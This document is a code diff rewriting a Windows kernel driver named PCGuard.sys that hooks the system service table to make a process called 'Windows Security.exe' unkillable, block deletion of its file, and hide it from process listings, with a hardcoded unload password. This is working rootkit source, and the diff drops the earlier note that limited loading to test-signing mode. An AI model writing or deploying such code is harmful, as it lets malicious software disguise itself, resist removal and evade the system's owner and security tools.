@@ -1,65 +1,83 @@
 /*
  * PCGuard.sys — PC Guardian Kernel Driver
  * Hooks NtTerminateProcess, NtDeleteFile, hides process from list
- * Build: WDK + Visual Studio (see build instructions)
- * Load: Test Signing Mode only (bcdedit /set testsigning on)
- *
- * Password: DECDRV — required to unload driver
+ * Password: DECDRV
  */
 
+// Force include shared headers before ntddk.h
+#include <ntdef.h>
 #include <ntddk.h>
 #include <wdm.h>
 #include "PCGuard.h"
 
 // ── GLOBALS ──────────────────────────────────────────────────────────────────
 
-DRIVER_OBJECT* g_DriverObject   = nullptr;
-ULONG          g_ProtectedPID   = 0;
-WCHAR          g_ProtectedName[] = L"Windows Security.exe";
-WCHAR          g_Password[]      = L"DECDRV";
-BOOLEAN        g_Hooked          = FALSE;
+ULONG  g_ProtectedPID    = 0;
+WCHAR  g_ProtectedName[] = L"Windows Security.exe";
+WCHAR  g_Password[]      = L"DECDRV";
+BOOLEAN g_Hooked         = FALSE;
 
-// Original function pointers (before hook)
 typedef NTSTATUS (NTAPI* fnNtTerminateProcess)(HANDLE, NTSTATUS);
-typedef NTSTATUS (NTAPI* fnNtDeleteFile)(POBJECT_ATTRIBUTES);
 typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
+typedef NTSTATUS (NTAPI* fnNtDeleteFile)(POBJECT_ATTRIBUTES);
 
-fnNtTerminateProcess         g_OrigTerminateProcess        = nullptr;
-fnNtDeleteFile               g_OrigDeleteFile              = nullptr;
-fnNtQuerySystemInformation   g_OrigQuerySystemInformation  = nullptr;
+fnNtTerminateProcess        g_OrigTerminateProcess       = nullptr;
+fnNtQuerySystemInformation  g_OrigQuerySysInfo           = nullptr;
+fnNtDeleteFile              g_OrigDeleteFile             = nullptr;
 
-// SSDT (System Service Descriptor Table) pointer
 PULONG_PTR g_SSDT = nullptr;
 
 // ── DEVICE ───────────────────────────────────────────────────────────────────
 
-#define DEVICE_NAME     L"\\Device\\PCGuard"
-#define SYMBOLIC_LINK   L"\\DosDevices\\PCGuard"
+#define DEVICE_NAME   L"\\Device\\PCGuard"
+#define SYMBOLIC_LINK L"\\DosDevices\\PCGuard"
 
-// IOCTL codes
-#define IOCTL_SET_PID   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_UNLOAD    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_SET_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNLOAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-// ── SSDT HOOK HELPERS ─────────────────────────────────────────────────────────
+// ── SYSTEM PROCESS INFO ───────────────────────────────────────────────────────
 
-ULONG GetSSDTIndex(LPCSTR funcName)
-{
-    // Read syscall index from ntdll in usermode image
-    // We use hardcoded indexes for Win10/11 as fallback
-    // NtTerminateProcess = 0x002C (Win10 21H2+)
-    // NtDeleteFile       = 0x000D
-    // NtQuerySystemInformation = 0x0036
+typedef struct _SYSTEM_PROCESS_INFO {
+    ULONG           NextEntryOffset;
+    ULONG           NumberOfThreads;
+    LARGE_INTEGER   WorkingSetPrivateSize;
+    ULONG           HardFaultCount;
+    ULONG           NumberOfThreadsHighWatermark;
+    ULONGLONG       CycleTime;
+    LARGE_INTEGER   CreateTime;
+    LARGE_INTEGER   UserTime;
+    LARGE_INTEGER   KernelTime;
+    UNICODE_STRING  ImageName;
+    LONG            BasePriority;
+    HANDLE          UniqueProcessId;
+    HANDLE          InheritedFromUniqueProcessId;
+    ULONG           HandleCount;
+    ULONG           SessionId;
+    ULONG_PTR       UniqueProcessKey;
+    SIZE_T          PeakVirtualSize;
+    SIZE_T          VirtualSize;
+    ULONG           PageFaultCount;
+    SIZE_T          PeakWorkingSetSize;
+    SIZE_T          WorkingSetSize;
+    SIZE_T          QuotaPeakPagedPoolUsage;
+    SIZE_T          QuotaPagedPoolUsage;
+    SIZE_T          QuotaPeakNonPagedPoolUsage;
+    SIZE_T          QuotaNonPagedPoolUsage;
+    SIZE_T          PagefileUsage;
+    SIZE_T          PeakPagefileUsage;
+    SIZE_T          PrivatePageCount;
+    LARGE_INTEGER   ReadOperationCount;
+    LARGE_INTEGER   WriteOperationCount;
+    LARGE_INTEGER   OtherOperationCount;
+    LARGE_INTEGER   ReadTransferCount;
+    LARGE_INTEGER   WriteTransferCount;
+    LARGE_INTEGER   OtherTransferCount;
+} SYSTEM_PROCESS_INFO, *PSYSTEM_PROCESS_INFO;
 
-    if (strcmp(funcName, "NtTerminateProcess") == 0)        return 0x002C;
-    if (strcmp(funcName, "NtDeleteFile") == 0)              return 0x000D;
-    if (strcmp(funcName, "NtQuerySystemInformation") == 0)  return 0x0036;
-    return 0xFFFF;
-}
-
+// ── SSDT HELPERS ──────────────────────────────────────────────────────────────
 
 PULONG_PTR GetSSDTBase()
 {
-    // Find SSDT via KeServiceDescriptorTable export
     UNICODE_STRING name;
     RtlInitUnicodeString(&name, L"KeServiceDescriptorTable");
     PULONG_PTR ksdt = (PULONG_PTR)MmGetSystemRoutineAddress(&name);
@@ -67,370 +85,189 @@ PULONG_PTR GetSSDTBase()
     return (PULONG_PTR)(*(PULONG_PTR)ksdt);
 }
 
+VOID DisableWP(ULONG_PTR* cr0) { *cr0 = __readcr0(); __writecr0(*cr0 & ~0x10000UL); _disable(); }
+VOID EnableWP(ULONG_PTR cr0)   { _enable(); __writecr0(cr0); }
 
-VOID DisableWriteProtect(ULONG_PTR* cr0)
+// Hardcoded syscall indexes for Windows 10/11
+#define IDX_NtTerminateProcess       0x002C
+#define IDX_NtDeleteFile             0x000D
+#define IDX_NtQuerySystemInformation 0x0036
+
+// ── HOOKED NtTerminateProcess ─────────────────────────────────────────────────
+
+NTSTATUS NTAPI HookedNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus)
 {
-    *cr0 = __readcr0();
-    __writecr0(*cr0 & ~0x10000);  // Clear WP bit
-    _disable();
-}
-
-
-VOID EnableWriteProtect(ULONG_PTR cr0)
-{
-    _enable();
-    __writecr0(cr0);
-}
-
-
-// ── HOOKED FUNCTIONS ──────────────────────────────────────────────────────────
-
-NTSTATUS NTAPI HookNtTerminateProcess(
-    HANDLE   ProcessHandle,
-    NTSTATUS ExitStatus
-)
-{
-    if (ProcessHandle == NtCurrentProcess())
-        return STATUS_ACCESS_DENIED;
-
-    // Resolve PID of target handle
-    PEPROCESS pTarget = nullptr;
-    if (NT_SUCCESS(ObReferenceObjectByHandle(
-        ProcessHandle, PROCESS_QUERY_INFORMATION,
-        *PsProcessType, KernelMode,
-        (PVOID*)&pTarget, nullptr)))
+    if (g_ProtectedPID && ProcessHandle != NtCurrentProcess())
     {
-        HANDLE targetPid = PsGetProcessId(pTarget);
-        ObDereferenceObject(pTarget);
-
-        if ((ULONG)(ULONG_PTR)targetPid == g_ProtectedPID)
+        PEPROCESS pProc = nullptr;
+        if (NT_SUCCESS(ObReferenceObjectByHandle(ProcessHandle, PROCESS_QUERY_INFORMATION,
+            *PsProcessType, KernelMode, (PVOID*)&pProc, nullptr)))
         {
-            DbgPrint("[PCGuard] Kill attempt on protected process BLOCKED (PID=%lu)\n",
-                     g_ProtectedPID);
-            return STATUS_ACCESS_DENIED;
+            ULONG pid = (ULONG)(ULONG_PTR)PsGetProcessId(pProc);
+            ObDereferenceObject(pProc);
+            if (pid == g_ProtectedPID)
+            {
+                DbgPrint("[PCGuard] Kill blocked PID=%lu\n", pid);
+                return STATUS_ACCESS_DENIED;
+            }
         }
     }
-
     return g_OrigTerminateProcess(ProcessHandle, ExitStatus);
 }
 
+// ── HOOKED NtDeleteFile ───────────────────────────────────────────────────────
 
-NTSTATUS NTAPI HookNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes)
+NTSTATUS NTAPI HookedNtDeleteFile(POBJECT_ATTRIBUTES ObjAttr)
 {
-    if (ObjectAttributes && ObjectAttributes->ObjectName)
+    if (ObjAttr && ObjAttr->ObjectName && ObjAttr->ObjectName->Buffer)
     {
-        UNICODE_STRING* name = ObjectAttributes->ObjectName;
-        // Check if file contains our exe name
-        if (name->Buffer)
+        UNICODE_STRING* n  = ObjAttr->ObjectName;
+        UNICODE_STRING  pn;
+        RtlInitUnicodeString(&pn, g_ProtectedName);
+        USHORT nlen  = n->Length  / sizeof(WCHAR);
+        USHORT pnlen = pn.Length  / sizeof(WCHAR);
+        for (USHORT i = 0; i + pnlen <= nlen; i++)
         {
-            UNICODE_STRING checkName;
-            RtlInitUnicodeString(&checkName, g_ProtectedName);
-
-            // Simple substring check
-            WCHAR* buf   = name->Buffer;
-            USHORT len   = name->Length / sizeof(WCHAR);
-            USHORT chklen = checkName.Length / sizeof(WCHAR);
-
-            for (USHORT i = 0; i + chklen <= len; i++)
+            if (_wcsnicmp(n->Buffer + i, pn.Buffer, pnlen) == 0)
             {
-                if (_wcsnicmp(buf + i, g_ProtectedName, chklen) == 0)
-                {
-                    DbgPrint("[PCGuard] Delete attempt on protected file BLOCKED\n");
-                    return STATUS_ACCESS_DENIED;
-                }
+                DbgPrint("[PCGuard] Delete blocked\n");
+                return STATUS_ACCESS_DENIED;
             }
         }
     }
-    return g_OrigDeleteFile(ObjectAttributes);
+    return g_OrigDeleteFile(ObjAttr);
 }
 
+// ── HOOKED NtQuerySystemInformation (process hiding) ─────────────────────────
 
-// ── PROCESS HIDING ────────────────────────────────────────────────────────────
-
-typedef struct _SYSTEM_PROCESS_INFORMATION {
-    ULONG           NextEntryOffset;
-    ULONG           NumberOfThreads;
-    LARGE_INTEGER   Reserved[3];
-    LARGE_INTEGER   CreateTime;
-    LARGE_INTEGER   UserTime;
-    LARGE_INTEGER   KernelTime;
-    UNICODE_STRING  ImageName;
-    KPRIORITY       BasePriority;
-    HANDLE          UniqueProcessId;
-    PVOID           InheritedFromUniqueProcessId;
-    ULONG           HandleCount;
-    ULONG           Reserved2[2];
-    ULONG           PrivatePageCount;
-    VM_COUNTERS     VirtualMemoryCounters;
-    IO_COUNTERS     IoCounters;
-    PVOID           Threads[0];
-} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;
-
-
-NTSTATUS NTAPI HookNtQuerySystemInformation(
-    ULONG  SystemInformationClass,
-    PVOID  SystemInformation,
-    ULONG  SystemInformationLength,
-    PULONG ReturnLength
-)
+NTSTATUS NTAPI HookedNtQuerySystemInformation(ULONG Class, PVOID Info, ULONG Len, PULONG Ret)
 {
-    NTSTATUS status = g_OrigQuerySystemInformation(
-        SystemInformationClass, SystemInformation,
-        SystemInformationLength, ReturnLength
-    );
+    NTSTATUS st = g_OrigQuerySysInfo(Class, Info, Len, Ret);
+    if (!NT_SUCCESS(st) || Class != 5 || !Info || !g_ProtectedPID) return st;
 
-    // SystemProcessInformation = 5
-    if (!NT_SUCCESS(status) || SystemInformationClass != 5)
-        return status;
-
-    if (!g_ProtectedPID || !SystemInformation)
-        return status;
-
-    // Walk process list and unlink our process
-    PSYSTEM_PROCESS_INFORMATION curr =
-        (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
-    PSYSTEM_PROCESS_INFORMATION prev = nullptr;
+    PSYSTEM_PROCESS_INFO cur  = (PSYSTEM_PROCESS_INFO)Info;
+    PSYSTEM_PROCESS_INFO prev = nullptr;
 
     while (TRUE)
     {
-        if ((ULONG)(ULONG_PTR)curr->UniqueProcessId == g_ProtectedPID)
+        if ((ULONG)(ULONG_PTR)cur->UniqueProcessId == g_ProtectedPID)
         {
-            DbgPrint("[PCGuard] Hiding PID %lu from query\n", g_ProtectedPID);
             if (prev)
-            {
-                if (curr->NextEntryOffset == 0)
-                    prev->NextEntryOffset = 0;
-                else
-                    prev->NextEntryOffset += curr->NextEntryOffset;
-            }
+                prev->NextEntryOffset = cur->NextEntryOffset
+                    ? prev->NextEntryOffset + cur->NextEntryOffset : 0;
         }
         else
         {
-            prev = curr;
+            prev = cur;
         }
-
-        if (curr->NextEntryOffset == 0) break;
-        curr = (PSYSTEM_PROCESS_INFORMATION)(
-            (ULONG_PTR)curr + curr->NextEntryOffset
-        );
+        if (!cur->NextEntryOffset) break;
+        cur = (PSYSTEM_PROCESS_INFO)((ULONG_PTR)cur + cur->NextEntryOffset);
     }
-
-    return status;
+    return st;
 }
-
 
 // ── INSTALL / REMOVE HOOKS ────────────────────────────────────────────────────
 
 NTSTATUS InstallHooks()
 {
     g_SSDT = GetSSDTBase();
-    if (!g_SSDT)
-    {
-        DbgPrint("[PCGuard] Failed to get SSDT base\n");
-        return STATUS_UNSUCCESSFUL;
-    }
+    if (!g_SSDT) return STATUS_UNSUCCESSFUL;
 
     ULONG_PTR cr0;
-    DisableWriteProtect(&cr0);
-
-    // Hook NtTerminateProcess
-    ULONG idx = GetSSDTIndex("NtTerminateProcess");
-    g_OrigTerminateProcess = (fnNtTerminateProcess)g_SSDT[idx];
-    g_SSDT[idx] = (ULONG_PTR)HookNtTerminateProcess;
-
-    // Hook NtDeleteFile
-    idx = GetSSDTIndex("NtDeleteFile");
-    g_OrigDeleteFile = (fnNtDeleteFile)g_SSDT[idx];
-    g_SSDT[idx] = (ULONG_PTR)HookNtDeleteFile;
-
-    // Hook NtQuerySystemInformation (for hiding)
-    idx = GetSSDTIndex("NtQuerySystemInformation");
-    g_OrigQuerySystemInformation = (fnNtQuerySystemInformation)g_SSDT[idx];
-    g_SSDT[idx] = (ULONG_PTR)HookNtQuerySystemInformation;
-
-    EnableWriteProtect(cr0);
+    DisableWP(&cr0);
+    g_OrigTerminateProcess = (fnNtTerminateProcess)       g_SSDT[IDX_NtTerminateProcess];
+    g_OrigDeleteFile       = (fnNtDeleteFile)              g_SSDT[IDX_NtDeleteFile];
+    g_OrigQuerySysInfo     = (fnNtQuerySystemInformation)  g_SSDT[IDX_NtQuerySystemInformation];
+    g_SSDT[IDX_NtTerminateProcess]       = (ULONG_PTR)HookedNtTerminateProcess;
+    g_SSDT[IDX_NtDeleteFile]             = (ULONG_PTR)HookedNtDeleteFile;
+    g_SSDT[IDX_NtQuerySystemInformation] = (ULONG_PTR)HookedNtQuerySystemInformation;
+    EnableWP(cr0);
 
     g_Hooked = TRUE;
-    DbgPrint("[PCGuard] SSDT hooks installed\n");
+    DbgPrint("[PCGuard] Hooks installed\n");
     return STATUS_SUCCESS;
 }
-
 
 VOID RemoveHooks()
 {
     if (!g_Hooked || !g_SSDT) return;
-
     ULONG_PTR cr0;
-    DisableWriteProtect(&cr0);
-
-    if (g_OrigTerminateProcess)
-        g_SSDT[GetSSDTIndex("NtTerminateProcess")] = (ULONG_PTR)g_OrigTerminateProcess;
-    if (g_OrigDeleteFile)
-        g_SSDT[GetSSDTIndex("NtDeleteFile")] = (ULONG_PTR)g_OrigDeleteFile;
-    if (g_OrigQuerySystemInformation)
-        g_SSDT[GetSSDTIndex("NtQuerySystemInformation")] = (ULONG_PTR)g_OrigQuerySystemInformation;
-
-    EnableWriteProtect(cr0);
+    DisableWP(&cr0);
+    if (g_OrigTerminateProcess) g_SSDT[IDX_NtTerminateProcess]       = (ULONG_PTR)g_OrigTerminateProcess;
+    if (g_OrigDeleteFile)       g_SSDT[IDX_NtDeleteFile]             = (ULONG_PTR)g_OrigDeleteFile;
+    if (g_OrigQuerySysInfo)     g_SSDT[IDX_NtQuerySystemInformation] = (ULONG_PTR)g_OrigQuerySysInfo;
+    EnableWP(cr0);
     g_Hooked = FALSE;
-    DbgPrint("[PCGuard] SSDT hooks removed\n");
 }
 
+// ── IOCTL ─────────────────────────────────────────────────────────────────────
 
-// ── IOCTL HANDLER ─────────────────────────────────────────────────────────────
-
-NTSTATUS HandleIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+NTSTATUS HandleIoctl(PDEVICE_OBJECT, PIRP Irp)
 {
-    UNREFERENCED_PARAMETER(DeviceObject);
+    PIO_STACK_LOCATION stk = IoGetCurrentIrpStackLocation(Irp);
+    ULONG code  = stk->Parameters.DeviceIoControl.IoControlCode;
+    ULONG inLen = stk->Parameters.DeviceIoControl.InputBufferLength;
+    PVOID inBuf = Irp->AssociatedIrp.SystemBuffer;
+    NTSTATUS st = STATUS_SUCCESS;
 
-    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
-    ULONG code    = stack->Parameters.DeviceIoControl.IoControlCode;
-    ULONG inLen   = stack->Parameters.DeviceIoControl.InputBufferLength;
-    PVOID inBuf   = Irp->AssociatedIrp.SystemBuffer;
-
-    NTSTATUS status   = STATUS_SUCCESS;
-    ULONG    bytesRet = 0;
-
-    switch (code)
+    if (code == IOCTL_SET_PID && inLen >= sizeof(ULONG) && inBuf)
     {
-        case IOCTL_SET_PID:
-        {
-            if (inLen >= sizeof(ULONG) && inBuf)
-            {
-                g_ProtectedPID = *(PULONG)inBuf;
-                DbgPrint("[PCGuard] Protecting PID: %lu\n", g_ProtectedPID);
-            }
-            else
-            {
-                status = STATUS_INVALID_PARAMETER;
-            }
-            break;
-        }
-
-        case IOCTL_UNLOAD:
-        {
-            // Verify password before allowing unload
-            if (inLen >= sizeof(WCHAR) * 6 && inBuf)
-            {
-                WCHAR* pw = (WCHAR*)inBuf;
-                if (_wcsicmp(pw, g_Password) == 0)
-                {
-                    DbgPrint("[PCGuard] Correct password — unloading\n");
-                    RemoveHooks();
-                    // Signal unload by setting PID to 0
-                    g_ProtectedPID = 0;
-                }
-                else
-                {
-                    DbgPrint("[PCGuard] Wrong password — unload denied\n");
-                    status = STATUS_ACCESS_DENIED;
-                }
-            }
-            else
-            {
-                status = STATUS_ACCESS_DENIED;
-            }
-            break;
-        }
-
-        default:
-            status = STATUS_INVALID_DEVICE_REQUEST;
-            break;
+        g_ProtectedPID = *(PULONG)inBuf;
+        DbgPrint("[PCGuard] Protecting PID %lu\n", g_ProtectedPID);
     }
+    else if (code == IOCTL_UNLOAD && inLen >= 10 && inBuf)
+    {
+        if (_wcsicmp((WCHAR*)inBuf, g_Password) == 0)
+            { RemoveHooks(); g_ProtectedPID = 0; }
+        else
+            st = STATUS_ACCESS_DENIED;
+    }
+    else st = STATUS_INVALID_DEVICE_REQUEST;
 
-    Irp->IoStatus.Status      = status;
-    Irp->IoStatus.Information = bytesRet;
+    Irp->IoStatus.Status = st; Irp->IoStatus.Information = 0;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
-    return status;
+    return st;
 }
 
-
-// ── DISPATCH FUNCTIONS ────────────────────────────────────────────────────────
-
-NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
+NTSTATUS DispatchAny(PDEVICE_OBJECT, PIRP Irp)
 {
-    UNREFERENCED_PARAMETER(DeviceObject);
-    Irp->IoStatus.Status      = STATUS_SUCCESS;
-    Irp->IoStatus.Information = 0;
+    Irp->IoStatus.Status = STATUS_SUCCESS; Irp->IoStatus.Information = 0;
     IoCompleteRequest(Irp, IO_NO_INCREMENT);
     return STATUS_SUCCESS;
 }
 
-
-// ── DRIVER UNLOAD ─────────────────────────────────────────────────────────────
-
-VOID DriverUnload(PDRIVER_OBJECT DriverObject)
+VOID DriverUnload(PDRIVER_OBJECT drv)
 {
-    UNREFERENCED_PARAMETER(DriverObject);
-
     RemoveHooks();
-
-    UNICODE_STRING symLink;
-    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK);
-    IoDeleteSymbolicLink(&symLink);
-
-    if (DriverObject->DeviceObject)
-        IoDeleteDevice(DriverObject->DeviceObject);
-
-    DbgPrint("[PCGuard] Driver unloaded\n");
+    UNICODE_STRING sym; RtlInitUnicodeString(&sym, SYMBOLIC_LINK);
+    IoDeleteSymbolicLink(&sym);
+    if (drv->DeviceObject) IoDeleteDevice(drv->DeviceObject);
 }
 
+// ── ENTRY ─────────────────────────────────────────────────────────────────────
 
-// ── DRIVER ENTRY ──────────────────────────────────────────────────────────────
-
-extern "C" NTSTATUS DriverEntry(
-    PDRIVER_OBJECT  DriverObject,
-    PUNICODE_STRING RegistryPath
-)
+extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING)
 {
-    UNREFERENCED_PARAMETER(RegistryPath);
-    DbgPrint("[PCGuard] Driver loading...\n");
+    DbgPrint("[PCGuard] Loading...\n");
 
-    g_DriverObject = DriverObject;
+    UNICODE_STRING dn; RtlInitUnicodeString(&dn, DEVICE_NAME);
+    PDEVICE_OBJECT dev = nullptr;
+    NTSTATUS st = IoCreateDevice(drv, 0, &dn, FILE_DEVICE_UNKNOWN,
+                                 FILE_DEVICE_SECURE_OPEN, FALSE, &dev);
+    if (!NT_SUCCESS(st)) return st;
 
-    // Create device
-    UNICODE_STRING devName;
-    RtlInitUnicodeString(&devName, DEVICE_NAME);
+    UNICODE_STRING sl; RtlInitUnicodeString(&sl, SYMBOLIC_LINK);
+    st = IoCreateSymbolicLink(&sl, &dn);
+    if (!NT_SUCCESS(st)) { IoDeleteDevice(dev); return st; }
 
-    PDEVICE_OBJECT devObj = nullptr;
-    NTSTATUS status = IoCreateDevice(
-        DriverObject, 0, &devName,
-        FILE_DEVICE_UNKNOWN,
-        FILE_DEVICE_SECURE_OPEN,
-        FALSE, &devObj
-    );
-
-    if (!NT_SUCCESS(status))
-    {
-        DbgPrint("[PCGuard] IoCreateDevice failed: 0x%X\n", status);
-        return status;
-    }
-
-    // Create symbolic link
-    UNICODE_STRING symLink;
-    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK);
-    status = IoCreateSymbolicLink(&symLink, &devName);
-    if (!NT_SUCCESS(status))
-    {
-        IoDeleteDevice(devObj);
-        return status;
-    }
-
-    // Set dispatch routines
-    DriverObject->DriverUnload = DriverUnload;
+    drv->DriverUnload = DriverUnload;
     for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
-        DriverObject->MajorFunction[i] = DispatchCreateClose;
-    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleIoctl;
+        drv->MajorFunction[i] = DispatchAny;
+    drv->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleIoctl;
+    dev->Flags |= DO_BUFFERED_IO;
+    dev->Flags &= ~DO_DEVICE_INITIALIZING;
 
-    devObj->Flags |= DO_BUFFERED_IO;
-    devObj->Flags &= ~DO_DEVICE_INITIALIZING;
-
-    // Install SSDT hooks
-    status = InstallHooks();
-    if (!NT_SUCCESS(status))
-    {
-        DbgPrint("[PCGuard] Hook install failed — running without hooks\n");
-    }
-
-    DbgPrint("[PCGuard] Driver loaded successfully\n");
+    InstallHooks();
+    DbgPrint("[PCGuard] Ready. Protecting PID=%lu\n", g_ProtectedPID);
     return STATUS_SUCCESS;
 }
